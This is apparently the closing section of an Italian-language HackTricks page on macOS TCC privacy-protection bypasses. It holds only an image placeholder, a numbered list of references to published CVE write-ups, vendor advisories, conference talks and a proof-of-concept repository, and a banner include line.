<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: bypass del framework Transparency, Consent, and Control (TCC) di macOS](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Bypass delle protezioni della privacy utente di macOS TCC: tra caso e intenzionalità](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - Bypass dei servizi di localizzazione TCC (segnalazione originale)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Dov’è finita Carmen Sandiego: abuso dei servizi di localizzazione su macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: il bypass TCC sottrae dati da iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (variabili d’ambiente SQLITE_ENABLE_SQLLOG)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Entitlement per consentire le variabili d’ambiente DYLD](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarizzazione: il runtime rafforzato](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [Scoperto un bypass TCC zero-day nel malware XCSSET](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "Quello che succede sul tuo Mac resta su iCloud di Apple?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Una nuova vulnerabilità di macOS, "powerdir", potrebbe consentire l’accesso non autorizzato ai dati degli utenti](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Modificare la home directory e bypassare TCC, alias CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Riprodurre musica e bypassare TCC, alias CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Come derubare una volpe (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - Bypass di TCC con Telegram su macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Alla scoperta delle vulnerabilità Apple: audit di diskarbitrationd e storagekitd, parte 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: click sintetici e CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - Impostare variabili d’ambiente su OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: bypass TCC e privilege escalation tramite mount_apfs](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: bypass TCC montando sopra il database TCC](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [Oltre 20 modi per bypassare i meccanismi di privacy di macOS](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [La vittoria definitiva contro TCC - Oltre 20 nuovi modi per bypassare i meccanismi di privacy di macOS](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [Da Spotlight ad Apple Intelligence — abuso di una vulnerabilità 0day per sottrarre i dati che alimentano l’IA di macOS](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
